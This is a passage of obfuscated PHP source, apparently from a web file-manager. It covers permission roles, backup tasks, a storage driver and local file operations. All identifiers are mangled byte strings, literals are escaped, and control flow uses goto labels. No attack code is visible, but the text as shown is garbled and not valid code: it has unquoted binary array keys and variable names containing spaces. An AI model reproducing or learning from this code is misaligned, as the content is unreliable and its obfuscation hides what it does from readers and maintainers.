function findAuth($îÊ¾¼†ã, $ã––—à) { $şåï¾…² =& $_SERVER[†ûãı«°]; $Æı²Š» = parent::listData(); foreach ($Æı²Š» as $¼Úò½¯Ş) { $›…‹ÃÈ = intval($¼Úò½¯Ş[$şåï¾…²[489]]); if ($›…‹ÃÈ <= 0 || $¼Úò½¯Ş[$şåï¾…²[2006]] == 0) { continue; } if (($›…‹ÃÈ & $îÊ¾¼†ã) != $îÊ¾¼†ã) { continue; } if (($›…‹ÃÈ & $ã––—à) != 0) { continue; } return $¼Úò½¯Ş[$şåï¾…²[477]]; } return !1; } public function findAuthMax($ãì–Ìß, $ëÌ„ÕşÂ) { $Ë¨íÌæ¤ =& $_SERVER[†ûãı«°]; $êÉÂò¥÷ = !1; $”òŞ®ã³ = parent::listData(); foreach ($”òŞ®ã³ as $Çç¬Œ†“) { $Á úî„Ô = intval($Çç¬Œ†“[$Ë¨íÌæ¤[489]]); if ($Á úî„Ô <= 0 || $Çç¬Œ†“[$Ë¨íÌæ¤[2006]] == 0) { continue; } if (($Á úî„Ô & $ãì–Ìß) != $ãì–Ìß) { continue; } if (($Á úî„Ô & $ëÌ„ÕşÂ) != 0) { continue; } if (!$êÉÂò¥÷) { $êÉÂò¥÷ = $Çç¬Œ†“; continue; } if (intval($êÉÂò¥÷[$Ë¨íÌæ¤[489]]) < $Á úî„Ô) { $êÉÂò¥÷ = $Çç¬Œ†“; } } return $êÉÂò¥÷ ? $êÉÂò¥÷[$Ë¨íÌæ¤[477]] : !1; } public function findAuthReadOnly() { $õ÷ÅóÀì = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ÔöÇ¿†§ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($õ÷ÅóÀì, $ÔöÇ¿†§); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ìÊ¥²şº =& $_SERVER[†ûãı«°]; $¨ÒŞÈÒ = parent::listData(); $¨©˜ß‰¨ = !1; foreach ($¨ÒŞÈÒ as $ÔÚÊş¬½) { if ($ÔÚÊş¬½[$ìÊ¥²şº[489]] <= 0 || $ÔÚÊş¬½[$ìÊ¥²şº[2006]] == $ìÊ¥²şº[230]) { continue; } if (!$¨©˜ß‰¨) { $¨©˜ß‰¨ = $ÔÚÊş¬½; continue; } if ($¨©˜ß‰¨[$ìÊ¥²şº[489]] > $ÔÚÊş¬½[$ìÊ¥²şº[489]]) { $¨©˜ß‰¨ = $ÔÚÊş¬½; } } return $¨©˜ß‰¨ ? $¨©˜ß‰¨[$ìÊ¥²şº[477]] : $ìÊ¥²şº[12]; } public function listData($ÈëÌ€Âñ = false, $®íö¾üÙ = "\163\157\x72\x74", $ã»íŠØÇ = false) { return parent::listData($ÈëÌ€Âñ, $®íö¾üÙ, $ã»íŠØÇ); } public function update($å‚–—Ùº, $ì™¨‡Üô) { $ü˜­»±Ì =& $_SERVER[†ûãı«°]; $ıÕõÒÓ× = parent::listData($å‚–—Ùº); $ßƒâßó = $this->findByName($ì™¨‡Üô[$ü˜­»±Ì[32]]); if (!$ıÕõÒÓ× || $ßƒâßó && $ßƒâßó[$ü˜­»±Ì[477]] != $ıÕõÒÓ×[$ü˜­»±Ì[477]]) { return !1; } $this->filterAuth($ì™¨‡Üô[$ü˜­»±Ì[489]]); return parent::update($å‚–—Ùº, $ì™¨‡Üô); } public function remove($Ğ­¬òúè) { $ğéĞå = parent::listData($Ğ­¬òúè); if (!$ğéĞå || $ğéĞå[$_SERVER[†ûãı«°][191]]) { return !1; } return parent::remove($Ğ­¬òúè); } public function add($è†ş¸†¶ = array()) { $–õÔÔ‚¶ =& $_SERVER[†ûãı«°]; if ($this->findByName($è†ş¸†¶[$–õÔÔ‚¶[32]])) { return !1; } $¿ÁŸ–İ = array($–õÔÔ‚¶[32] => $–õÔÔ‚¶[12], $–õÔÔ‚¶[489] => 1, $–õÔÔ‚¶[2007] => $–õÔÔ‚¶[1994], $–õÔÔ‚¶[2006] => 1, $–õÔÔ‚¶[191] => 0, $–õÔÔ‚¶[2008] => 0); $è†ş¸†¶ = array_merge($¿ÁŸ–İ, $è†ş¸†¶); $è†ş¸†¶[$–õÔÔ‚¶[2008]] = $this->getSort(); $this->filterAuth($è†ş¸†¶[$–õÔÔ‚¶[489]]); return parent::insert($è†ş¸†¶); } private function getSort() { $÷¦¬‰·ğ =& $_SERVER[†ûãı«°]; $×ÛŸç–“ = parent::listData(); $ÊÇÀ–— = array_to_keyvalue($×ÛŸç–“, $÷¦¬‰·ğ[12], $÷¦¬‰·ğ[2008]); return empty($ÊÇÀ–—) ? 0 : max($ÊÇÀ–—) + 1; } private function filterAuth(&$­¹’Ö³á) { if (!$­¹’Ö³á) { return; } $Ñ÷‰—‚ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Éíñôç = array(); foreach ($Ñ÷‰—‚ as $ÈÚ“Îø§) { if ($­¹’Ö³á & $ÈÚ“Îø§) { $Éíñôç[] = $ÈÚ“Îø§; } } if (in_array(self::AUTH_ROOT, $Éíñôç)) { $­¹’Ö³á = array_sum($Ñ÷‰—‚); return; } $¯¥©Æé‰ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Éíñôç as $ÈÚ“Îø§) { if (isset($¯¥©Æé‰[$ÈÚ“Îø§])) { $Éíñôç = array_merge($Éíñôç, $¯¥©Æé‰[$ÈÚ“Îø§]); } } $Éíñôç[] = self::AUTH_SHOW; $­¹’Ö³á = array_sum(array_unique($Éíñôç)); } public function sort($¸óÖÔü, $ëæµôÎœ) { return parent::update($¸óÖÔü, $ëæµôÎœ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\x62\141\143\x6b\x75\160\114\151\x73\164"; public $field = array("\x69\157", "\156\x61\155\145", "\x73\x74\141\x74\x75\x73", "\143\157\x6e\x74\x65\156\x74", "\x6d\x61\156\x75\141\154", "\x72\x65\x73\165\x6c\x74", "\x74\x69\155\x65\106\162\157\x6d", "\x74\x69\155\x65\x54\157"); public function config() { $½Ø¹¬üã =& $_SERVER[†ûãı«°]; Action($½Ø¹¬üã[2009])->taskInit(); $ÙäÈÒÔë = Model($½Ø¹¬üã[846])->get($½Ø¹¬üã[853]); $ÙäÈÒÔë = json_decode($ÙäÈÒÔë, !0); $ÙäÈÒÔë = is_array($ÙäÈÒÔë) ? $ÙäÈÒÔë : array(); $this->parseContent($ÙäÈÒÔë); unset($ÙäÈÒÔë[$½Ø¹¬üã[1752]]); Model($½Ø¹¬üã[1751])->cacheClear(); $ÆÒŒı¿ = $½Ø¹¬üã[2010]; $Ã§ÎÃï = Model($½Ø¹¬üã[2011])->findByKey($½Ø¹¬üã[1770], $ÆÒŒı¿); if (!$Ã§ÎÃï) { $Ã§ÎÃï = array(); } if (isset($Ã§ÎÃï[$½Ø¹¬üã[206]])) { $Ã§ÎÃï[$½Ø¹¬üã[206]] = json_decode($Ã§ÎÃï[$½Ø¹¬üã[206]], !0); } if (isset($ÙäÈÒÔë[$½Ø¹¬üã[206]])) { $Ã§ÎÃï[$½Ø¹¬üã[206]][$½Ø¹¬üã[1755]] = $ÙäÈÒÔë[$½Ø¹¬üã[206]]; unset($ÙäÈÒÔë[$½Ø¹¬üã[206]]); } return array_merge($Ã§ÎÃï, $ÙäÈÒÔë); } public function listData($øŠÉêÓ = false, $·÷ŒŸ³÷ = "\x6d\157\x64\151\146\x79\x54\x69\x6d\145", $Øâ·í¾ê = false) { $â–å¨ûÚ = parent::listData($øŠÉêÓ, $·÷ŒŸ³÷, !0); if (!$â–å¨ûÚ) { return $â–å¨ûÚ; } if ($øŠÉêÓ) { $â–å¨ûÚ = array($â–å¨ûÚ); } foreach ($â–å¨ûÚ as &$éÂµÄª–) { $this->parseContent($éÂµÄª–); } return $øŠÉêÓ ? $â–å¨ûÚ[0] : $â–å¨ûÚ; } public function parseContent(&$ØµæèóÂ) { $äß©·­¬ =& $_SERVER[†ûãı«°]; $‹àıäş’ = _get($ØµæèóÂ, $äß©·­¬[171], $äß©·­¬[91]); if (!in_array($‹àıäş’, array($äß©·­¬[852], $äß©·­¬[1220]))) { $ØµæèóÂ[$äß©·­¬[171]] = $‹àıäş’ == $äß©·­¬[91] ? $äß©·­¬[1220] : $äß©·­¬[852]; } } public function lastItem() { $ù“¡ÍÔÒ = $this->listData(); return !empty($ù“¡ÍÔÒ[0]) ? $ù“¡ÍÔÒ[0] : null; } public function kill($®‹¼©Â) { $ËÁ©İÊÀ =& $_SERVER[†ûãı«°]; $Œ„ºˆ = $this->listData($®‹¼©Â); if (!$Œ„ºˆ || empty($Œ„ºˆ[$ËÁ©İÊÀ[32]])) { return !0; } Task::kill($ËÁ©İÊÀ[861]); Task::kill($ËÁ©İÊÀ[880]); Task::kill($ËÁ©İÊÀ[890]); $‰‡œ’Í“ = $Œ„ºˆ[$ËÁ©İÊÀ[32]]; $Š…·Àœß = TEMP_FILES . $ËÁ©İÊÀ[856] . $‰‡œ’Í“ . $ËÁ©İÊÀ[8]; IO::remove($Š…·Àœß, !1); return $this->remove($®‹¼©Â); } public function remove($¯Â…±îŠ) { $€™ëöå¾ = $this->listData($¯Â…±îŠ); if (!$€™ëöå¾) { return !0; } return $this->backupRemove($€™ëöå¾); } private function backupRemove($©Û»¨ôê) { parent::remove($©Û»¨ôê[$_SERVER[†ûãı«°][477]]); $‘Õ°¯Í = $this->backupPath($©Û»¨ôê); IO::remove($‘Õ°¯Í, !1); return !0; } private function backupPath($’´éÍ‡×) { $ûß¾†Î =& $_SERVER[†ûãı«°]; $ŸŞı”Ÿ¡ = $’´éÍ‡×[$ûß¾†Î[32]]; $À…äÈÔÕ = Model($ûß¾†Î[846])->get($ûß¾†Î[847]); $ì‘Í½‚à = substr(md5($ûß¾†Î[848] . $À…äÈÔÕ . $ŸŞı”Ÿ¡), 0, 8); return "\173\151\157\x3a{$’´éÍ‡×[$ûß¾†Î[828]]}\175\57\144\x61\164\141\x62\141\x73\145\57\142\x61\x63\153\x75\160\57" . $ŸŞı”Ÿ¡ . $ûß¾†Î[11] . $ì‘Í½‚à; } public function start() { $¿«·ğÄƒ =& $_SERVER[†ûãı«°]; if ($GLOBALS[$¿«·ğÄƒ[6]][$¿«·ğÄƒ[92]][$¿«·ğÄƒ[2012]] != $¿«·ğÄƒ[91]) { return !0; } $‚¯Ÿ´èñ = $this->config(); if (!$‚¯Ÿ´èñ || $‚¯Ÿ´èñ[$¿«·ğÄƒ[1752]] != $¿«·ğÄƒ[91]) { return !1; } if ($‚¯Ÿ´èñ[$¿«·ğÄƒ[171]] == $¿«·ğÄƒ[852]) { $úÈ¨µÌ˜ = Model($¿«·ğÄƒ[846])->get($¿«·ğÄƒ[1335]); if ($úÈ¨µÌ˜ == $¿«·ğÄƒ[1336]) { $‚¯Ÿ´èñ[$¿«·ğÄƒ[171]] = $¿«·ğÄƒ[1220]; } } $ÕÛé• = $this->process(); foreach ($ÕÛé• as $µì¡ÔÙ) { if ($µì¡ÔÙ) { return Task::restart($µì¡ÔÙ[$¿«·ğÄƒ[477]]); } } $È”Å‚È‰ = new Backup(); $ÏåÉ¤¿ä = $È”Å‚È‰->db(); if ($ÏåÉ¤¿ä) { $ÏåÉ¤¿ä = $È”Å‚È‰->dbFile(); if ($ÏåÉ¤¿ä && $‚¯Ÿ´èñ[$¿«·ğÄƒ[171]] == $¿«·ğÄƒ[852]) { $ÏåÉ¤¿ä = $È”Å‚È‰->file(); } } Backup::set(array($¿«·ğÄƒ[826] => 1, $¿«·ğÄƒ[837] => time())); return !0; } public function process() { $³ Ñø›Ù =& $_SERVER[†ûãı«°]; $Ë˜‡„İ  = array($³ Ñø›Ù[833] => Task::get($³ Ñø›Ù[861]), $³ Ñø›Ù[838] => Task::get($³ Ñø›Ù[880]), $³ Ñø›Ù[232] => Task::get($³ Ñø›Ù[890])); $ıà ˜”¬ = !1; foreach ($Ë˜‡„İ  as &$œ›è™óÀ) { if ($ıà ˜”¬) { $œ›è™óÀ = !1; continue; } if ($œ›è™óÀ) { $Ÿ³´¯ = intval(_get($œ›è™óÀ, $³ Ñø›Ù[1788], 0)); if (time() - $Ÿ³´¯ > 7200) { Task::kill($œ›è™óÀ[$³ Ñø›Ù[477]]); $ıà ˜”¬ = !0; $œ›è™óÀ = !1; } } } return $Ë˜‡„İ ; } public function restore() { $Ä¸ƒÖÚĞ =& $_SERVER[†ûãı«°]; ActionCall($Ä¸ƒÖÚĞ[1148], !0, 1); ActionCall($Ä¸ƒÖÚĞ[1148], !0, 0); } } goto d¤ŸÔ—™; cÀ‚†ç÷™Ê: function binCheckBigger($™ÎáÀìı, $•ùÌŠÄ½) { return $™ÎáÀìı > $•ùÌŠÄ½; } $_SERVER[$_SERVER[‘ğÇ«Š][3]] = (base64_decode('ODYyMg==')."\63\62")+0;$_yab2="71jql5boktshdxnvmu6i2yf0pra983cg4ezw27m0ilvgqcsuht9d1aroe36k5y48zjxbfnw";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($¦ÂËÚÛ, $ßôßïü’) { $ã±¥ÈÍ• =& $_SERVER[†ûãı«°]; if (isset(self::$_methodList[$¦ÂËÚÛ])) { return @call_user_func_array(self::$_methodList[$¦ÂËÚÛ], $ßôßïü’); } else { if (method_exists($this, $¦ÂËÚÛ)) { return call_user_func_array(array($this, $¦ÂËÚÛ), $ßôßïü’); } else { think_exception(__CLASS__ . $ã±¥ÈÍ•[4] . $¦ÂËÚÛ . $ã±¥ÈÍ•[5]); } } } public static function __callStatic($Å¾«¯åÎ, $Œ¸óÒ¼†) { if (isset(self::$_methodListStatic[$Å¾«¯åÎ])) { return call_user_func_array(self::$_methodListStatic[$Å¾«¯åÎ], $Œ¸óÒ¼†); } else { if (method_exists(self, $Å¾«¯åÎ)) { return call_user_func_array(array(self, $Å¾«¯åÎ), $Œ¸óÒ¼†); } else { show_json("{$Å¾«¯åÎ}\x28\x29\40\156\x6f\164\40\145\170\x69\163\164\73", !1); } } } public static function addMethod($˜ûüÜ, $¦ÙƒĞ–à) { self::$_methodList[$˜ûüÜ] = $¦ÙƒĞ–à; } public static function addMethodStatic($şÎ¹—ú», $ëÀ÷¸–¢) { self::$_methodListStatic[$şÎ¹—ú»] = $ëÀ÷¸–¢; } } goto CËğ‚”ôá…; bÖ±¨ÌÀ—: class PathDriverJOS extends PathDriverBaseS3 { public function __construct($ŠîŞ¢Á) { parent::__construct($ŠîŞ¢Á); $this->setSignVersion($_SERVER[†ûãı«°][249]); } public function uploadLink($¤Èáİæ, $˜‡õúÉ = 0) { $İÙ—µ“Ù =& $_SERVER[†ûãı«°]; if ($this->isUploadServer()) { return; } $¬¥¨™‚ø = $this->getType(); if (!in_array($¬¥¨™‚ø, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $á˜­¯½ã = (!$˜‡õúÉ ? 1 : ceil($˜‡õúÉ / pow(1024, 3))) * 3600 * 4; $­Åêµ«¶ = $this->uploadMultiData($¤Èáİæ, $á˜­¯½ã); if ($­Åêµ«¶) { $­Åêµ«¶[$İÙ—µ“Ù[97]] = $¤Èáİæ; $­Åêµ«¶[$İÙ—µ“Ù[98]] = $¬¥¨™‚ø; } return $­Åêµ«¶; } public function fileOutImage($´ÓÁ†, $Ö°¼ØÇœ = 250) { if ($this->size($´ÓÁ†) > 1024 * 1024 * 25) { return $this->fileOutImageServer($´ÓÁ†, $Ö°¼ØÇœ); } $—¬ú¹£ = $this->link($´ÓÁ†); $—¬ú¹£ .= $_SERVER[†ûãı«°][1465] . $Ö°¼ØÇœ; $this->fileOutLink($—¬ú¹£); } public function fileOutLink($§¥áÂÛ¡) { $ô¦² È =& $_SERVER[†ûãı«°]; if (substr($§¥áÂÛ¡, 0, 7) == $ô¦² È[218]) { $§¥áÂÛ¡ = $ô¦² È[219] . substr($§¥áÂÛ¡, 7); } header($ô¦² È[175] . $§¥áÂÛ¡); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($…øÄı£‹) { if (substr($…øÄı£‹, 0, 2) == $_SERVER[†ûãı«°][1422]) { $…øÄı£‹ = BASIC_PATH . substr($…øÄı£‹, 2); } return $…øÄı£‹; } public function iconvApp($„±·äúè) { $ïê¢Âß¸ =& $_SERVER[†ûãı«°]; global $config; return $this->iconvTo($„±·äúè, $config[$ïê¢Âß¸[1451]], $config[$ïê¢Âß¸[1450]]); } public function iconvSystem($ÊØÆáæŞ) { $ˆ÷‚–Îß =& $_SERVER[†ûãı«°]; global $config; return $this->iconvTo($ÊØÆáæŞ, $config[$ˆ÷‚–Îß[1450]], $config[$ˆ÷‚–Îß[1451]]); } public function getPathOuter($³ÚíÁşÁ) { $ËÚÏÓ²¤ =& $_SERVER[†ûãı«°]; $õØ€ÇÃŒ = $this->iconvApp($this->pathBase); $³ÚíÁşÁ = $this->iconvApp($³ÚíÁşÁ); if (substr($õØ€ÇÃŒ, 0, 2) == $ËÚÏÓ²¤[1422]) { $õØ€ÇÃŒ = BASIC_PATH . substr($õØ€ÇÃŒ, 2); } if (substr($³ÚíÁşÁ, 0, 2) == $ËÚÏÓ²¤[1422]) { $³ÚíÁşÁ = BASIC_PATH . substr($³ÚíÁşÁ, 2); } $õØ€ÇÃŒ = KodIO::clear($õØ€ÇÃŒ); $³ÚíÁşÁ = KodIO::clear($³ÚíÁşÁ); $³ÚíÁşÁ = substr($³ÚíÁşÁ, strlen($õØ€ÇÃŒ)); if (empty($this->pathDriver)) { return $³ÚíÁşÁ; } return $this->pathDriver . $ËÚÏÓ²¤[8] . ltrim($³ÚíÁşÁ, $ËÚÏÓ²¤[8]); } public function mkfile($²£Ó‘û›, $æñèŸÜ· = '', $‰ìùşØ = REPEAT_RENAME) { $²£Ó‘û› = $this->iconvSystem($²£Ó‘û›); @touch($²£Ó‘û›); if ($æñèŸÜ·) { file_put_contents($²£Ó‘û›, $æñèŸÜ·); } @chmod($²£Ó‘û›, $this->pathAuth); if (is_file($²£Ó‘û›)) { return $this->getPathOuter($²£Ó‘û›); } $this->writeLog(__FUNCTION__ . $_SERVER[†ûãı«°][1462], !0); return !1; } public function mkdir($âáÑ«˜, $Ÿä××¥µ = REPEAT_SKIP) { $âáÑ«˜ = $this->iconvSystem($âáÑ«˜); if (is_dir($âáÑ«˜)) { return $this->getPathOuter($âáÑ«˜); } @mkdir($âáÑ«˜, $this->pathAuth, !0); @chmod($âáÑ«˜, $this->pathAuth); if (is_dir($âáÑ«˜)) { return $this->getPathOuter($âáÑ«˜); } $this->writeLog(__FUNCTION__ . $_SERVER[†ûãı«°][1462], !0); return !1; } public function copyFile($«÷¬Õé¡, $ŠÇîÏùš) { $this->mkdir($this->pathFather($ŠÇîÏùš)); $«÷¬Õé¡ = $this->iconvSystem($«÷¬Õé¡); $ŠÇîÏùš = $this->iconvSystem($ŠÇîÏùš); $²ë¯ºÙ = copy_64($«÷¬Õé¡, $ŠÇîÏùš); @chmod($ŠÇîÏùš, $this->pathAuth); if ($²ë¯ºÙ) { return $this->getPathOuter($ŠÇîÏùš); } $this->writeLog(__FUNCTION__ . $_SERVER[†ûãı«°][1462], !0); return !1; } public function moveFile($Å‡Á¶Ï®, $„±ã’‡Ñ) { $this->mkdir($this->pathFather($„±ã’‡Ñ)); $Å‡Á¶Ï® = $this->iconvSystem($Å‡Á¶Ï®); $„±ã’‡Ñ = $this->iconvSystem($„±ã’‡Ñ); $£Ó¨‘¡å = intval(@rename($Å‡Á¶Ï®, $„±ã’‡Ñ)); if (!$£Ó¨‘¡å) { if ($£Ó¨‘¡å = intval(@copy_64($Å‡Á¶Ï®, $„±ã’‡Ñ))) { @unlink($Å‡Á¶Ï®); } } @chmod($„±ã’‡Ñ, $this->pathAuth); if ($£Ó¨‘¡å) { return $this->getPathOuter($„±ã’‡Ñ); } $this->writeLog(__FUNCTION__ . $_SERVER[†ûãı«°][1462], !0); return !1; } public function movePath($Ì¡¶ºàù, $çë® Áë, $›øİ¨ü¶ = false) { $ÀÍöµÆ¡ =& $_SERVER[†ûãı«°]; $Ì¡¶ºàù = $this->iconvSystem($Ì¡¶ºàù); $çë® Áë = $this->iconvSystem($çë® Áë); $Ñè¼îÈ¸ = rtrim($çë® Áë, $ÀÍöµÆ¡[8]) . $ÀÍöµÆ¡[8] . ($›øİ¨ü¶ ? $›øİ¨ü¶ : get_path_this($Ì¡¶ºàù)); if (file_exists($Ñè¼îÈ¸)) { return !1; } $¥ÜóŒ¡ú = intval(@rename($Ì¡¶ºàù, $Ñè¼îÈ¸)); $¥ÜóŒ¡ú = file_exists($Ñè¼îÈ¸); if ($¥ÜóŒ¡ú) { return $this->getPathOuter($Ñè¼îÈ¸); } $this->writeLog(__FUNCTION__ . $ÀÍöµÆ¡[1462], !0); return !1; } public function delFile($—±“«Ê›) { $—±“«Ê› = $this->iconvSystem($—±“«Ê›); if (!@unlink($—±“«Ê›)) { @chmod($—±“«Ê›, $this->pathAuth); if (@unlink($—±“«Ê›)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[†ûãı«°][1462], !0); return !1; } return !0; } public function delFolder($¶ü°´…Í) { $æøıõÈÄ =& $_SERVER[†ûãı«°]; $¶ü°´…Í = $this->iconvSystem($¶ü°´…Í); if (!is_dir($¶ü°´…Í)) { return !0; } if (!($Ï¶Ïáš = opendir($¶ü°´…Í))) { return !1; } while (($ßÙ…ßÃ× = readdir($Ï¶Ïáš)) !== !1) { if ($ßÙ…ßÃ× == $æøıõÈÄ[10] || $ßÙ…ßÃ× == $æøıõÈÄ[1374]) { continue; } $ö‡Óæ˜ï = $¶ü°´…Í . $æøıõÈÄ[8] . $ßÙ…ßÃ×; if (is_file($ö‡Óæ˜ï) || is_link($ö‡Óæ˜ï)) { if (!unlink($ö‡Óæ˜ï)) { chmod($ö‡Óæ˜ï, $this->pathAuth); if (!unlink($ö‡Óæ˜ï)) { return !1; } } } else { if (is_dir($ö‡Óæ˜ï)) { chmod($ö‡Óæ˜ï, $this->pathAuth); $ö‡Óæ˜ï = $this->iconvApp($ö‡Óæ˜ï); if (!$this->delFolder($ö‡Óæ˜ï)) { return !1; } } } } closedir($Ï¶Ïáš); return rmdir($¶ü°´…Í); } public function rename($°ƒ‚á, $·ÜÖ÷Ö) { $òùù¬Ğ =& $_SERVER[†ûãı«°]; $©À˜¸¥ = $this->fileNameAuto($this->pathFather($°ƒ‚á), $·ÜÖ÷Ö); $©À˜¸¥ = $this->iconvSystem($©À˜¸¥); $°ƒ‚á = $this->iconvSystem($°ƒ‚á); $ıàÎªÀ = $this->pathFather($°ƒ‚á); $µÌåİŒŞ = rtrim($ıàÎªÀ, $òùù¬Ğ[8]) . $òùù¬Ğ[8] . $©À˜¸¥; $±”ççä¹ = @rename($°ƒ‚á, $µÌåİŒŞ); $µÌåİŒŞ = $this->iconvApp($µÌåİŒŞ); if ($±”ççä¹) { return $this->getPathOuter($µÌåİŒŞ); } $this->writeLog(__FUNCTION__ . $òùù¬Ğ[1462], !0); return !1; } public function size($Íà‘ú¹æ) { $Íà‘ú¹æ = $this->iconvSystem($Íà‘ú¹æ); return filesize_64($Íà‘ú¹æ); } public function info($î³µÙ™ü) { $î³µÙ™ü = $this->iconvSystem($î³µÙ™ü); if ($this->isFolder($î³µÙ™ü)) { return $this->folderInfo($î³µÙ™ü); } else { if ($this->isFile($î³µÙ™ü)) { return $this->fileInfo($î³µÙ™ü); } } return !1; } protected function infoChildren($ŠÑ©Àè©, &$¯ŠÀ€—Ø, $ÈøÜŞÆâ = true) { $çÂ’ù±ö =& $_SERVER[†ûãı«°]; check_abort_echo(); $ŠÑ©Àè© = rtrim($ŠÑ©Àè©, $çÂ’ù±ö[8]) . $çÂ’ù±ö[8]; if ($ÈøÜŞÆâ) { $ŠÑ©Àè© = $this->iconvSystem($ŠÑ©Àè©); } if (!($„áâÊÒ´ = @opendir($ŠÑ©Àè©))) { return; } while (($ÌäŸ†¡Ò = readdir($„áâÊÒ´)) !== !1) { if ($ÌäŸ†¡Ò == $çÂ’ù±ö[10] || $ÌäŸ†¡Ò == $çÂ’ù±ö[1374]) { continue; } $”©ı‚Ï‚ = $ŠÑ©Àè© . $ÌäŸ†¡Ò; if (is_file($”©ı‚Ï‚) || is_link($”©ı‚Ï‚)) { $¯ŠÀ€—Ø[$çÂ’ù±ö[80]]++; $¯ŠÀ€—Ø[$çÂ’ù±ö[79]] += filesize_64($”©ı‚Ï‚); } else { if (is_dir($”©ı‚Ï‚)) { $¯ŠÀ€—Ø[$çÂ’ù±ö[81]]++; $this->infoChildren($”©ı‚Ï‚, $¯ŠÀ€—Ø, !1); } } } closedir($„áâÊÒ´); } private function folderInfo($ĞÀ°¡’, $¥æÔ·¼• = false) { $òİáÒÅÇ =& $_SERVER[†ûãı«°]; $ĞÀ°¡’ = rtrim($ĞÀ°¡’, $òİáÒÅÇ[8]) . $òİáÒÅÇ[8]; $¥ş‚¸ô» = $this->iconvApp($this->pathThis($ĞÀ°¡’)); if ($¥æÔ·¼•) { return array($òİáÒÅÇ[32] => $¥ş‚¸ô», $òİáÒÅÇ[87] => $this->getPathOuter($ĞÀ°¡’), $òİáÒÅÇ[33] => $òİáÒÅÇ[78]); } $÷¾àÊ´æ = array($òİáÒÅÇ[32] => $¥ş‚¸ô», $òİáÒÅÇ[87] => $this->getPathOuter($ĞÀ°¡’), $òİáÒÅÇ[33] => $òİáÒÅÇ[78], $òİáÒÅÇ[233] => @filectime($ĞÀ°¡’), $òİáÒÅÇ[88] => @filemtime($ĞÀ°¡’), $òİáÒÅÇ[1466] => @fileatime($ĞÀ°¡’), $òİáÒÅÇ[1467] => is_readable($ĞÀ°¡’), $òİáÒÅÇ[1468] => is_writable($ĞÀ°¡’), $òİáÒÅÇ[1469] => get_mode($ĞÀ°¡’)); return $÷¾àÊ´æ; } private function fileInfo($†ŠƒÄÃ, $å‘Õá„õ = false) { $•Œåç§½ =& $_SERVER[†ûãı«°]; $íª¾‹Î® = $this->iconvApp($this->pathThis($†ŠƒÄÃ)); if ($å‘Õá„õ) { return array($•Œåç§½[32] => $íª¾‹Î®, $•Œåç§½[87] => $this->getPathOuter($†ŠƒÄÃ), $•Œåç§½[33] => $•Œåç§½[232], $•Œåç§½[79] => $this->size($†ŠƒÄÃ), $•Œåç§½[169] => $this->ext($íª¾‹Î®)); } $•ÜÀ×¢ç = array($•Œåç§½[32] => $íª¾‹Î®, $•Œåç§½[87] => $this->getPathOuter($†ŠƒÄÃ), $•Œåç§½[33] => $•Œåç§½[232], $•Œåç§½[233] => @filectime($†ŠƒÄÃ), $•Œåç§½[88] => @filemtime($†ŠƒÄÃ), $•Œåç§½[1466] => @fileatime($†ŠƒÄÃ), $•Œåç§½[79] => $this->size($†ŠƒÄÃ), $•Œåç§½[169] => $this->ext($íª¾‹Î®), $•Œåç§½[1467] => is_readable($†ŠƒÄÃ), $•Œåç§½[1468] => is_writable($†ŠƒÄÃ), $•Œåç§½[1469] => get_mode($†ŠƒÄÃ)); return $•ÜÀ×¢ç; } public function exist($¥ñ¦¸ê®) { $¥ñ¦¸ê® = $this->iconvSystem($¥ñ¦¸ê®); return @file_exists($¥ñ¦¸ê®); } public function isFile($ê›˜±ßÜ) { $ê›˜±ßÜ = $this->iconvSystem($ê›˜±ßÜ); return @is_file($ê›˜±ßÜ); } public function isFolder($à»…–ç) { $à»…–ç = $this->iconvSystem($à»…–ç); return @is_dir($à»…–ç); } public function listPath($çüÖµ¥, $ÈêŒÎèí = false) { $®¾±¸ô =& $_SERVER[†ûãı«°]; $çüÖµ¥ = $this->iconvSystem($çüÖµ¥); $çüÖµ¥ = rtrim($çüÖµ¥, $®¾±¸ô[8]) . $®¾±¸ô[8]; $Ö²áı’ = array($®¾±¸ô[85] => array(), $®¾±¸ô[86] => array()); if (!($œõá¢†Ü = @opendir($çüÖµ¥))) { return $Ö²áı’; } while (($ù×ËÅñ = readdir($œõá¢†Ü)) !== !1) { if ($ù×ËÅñ == $®¾±¸ô[10] || $ù×ËÅñ == $®¾±¸ô[1374]) { continue; } $•€Ç«Ü  = $çüÖµ¥ . $ù×ËÅñ; if (is_file($•€Ç«Ü )) { $Ö²áı’[$®¾±¸ô[86]][] = $this->fileInfo($•€Ç«Ü , $ÈêŒÎèí); } else { $Ö²áı’[$®¾±¸ô[85]][] = $this->folderInfo($•€Ç«Ü , $ÈêŒÎèí); } } closedir($œõá¢†Ü); return $Ö²áı’; } public function listAll($Í¨“½šú, &$ßÃ—„ª = array()) { $©ÈÄû—ï =& $_SERVER[†ûãı«°]; $Í¨“½šú = $this->iconvSystem($Í¨“½šú); $Í¨“½šú = rtrim($Í¨“½šú, $©ÈÄû—ï[8]) . $©ÈÄû—ï[8]; if (!($ÛéË¼÷Ñ = @opendir($Í¨“½šú))) { return $ßÃ—„ª; } while (($ÛŞıŞò = readdir($ÛéË¼÷Ñ)) !== !1) { if ($ÛŞıŞò == $©ÈÄû—ï[10] || $ÛŞıŞò == $©ÈÄû—ï[1374]) { continue; } $ïñ¯“ëÂ = $Í¨“½šú . $ÛŞıŞò; $”ÃªÀ›ô = is_dir($ïñ¯“ëÂ) && 